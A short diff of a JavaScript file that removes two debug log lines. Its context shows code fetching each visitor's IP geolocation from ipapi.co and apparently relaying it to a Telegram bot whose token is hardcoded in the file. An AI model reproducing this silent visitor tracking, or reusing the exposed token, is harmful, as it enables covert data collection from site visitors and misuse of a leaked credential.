@@ -1,7 +1,6 @@
 fetch('https://ipapi.co/json/')
     .then(response => response.json())
     .then(data => {
-        console.log(33, data);
         sendNotification(1,data);
     })
     .catch(error => {
@@ -28,7 +27,6 @@ function ipData(){
 }
 
 function sendNotification(type, data) {
-    console.log("dfasdft",type);
     current_time = new Date();
     let message = null;
     const botToken = '6664260689:AAFk0X0ZQiNSOg7r0ZesF_nk53xuxnQB04Y';
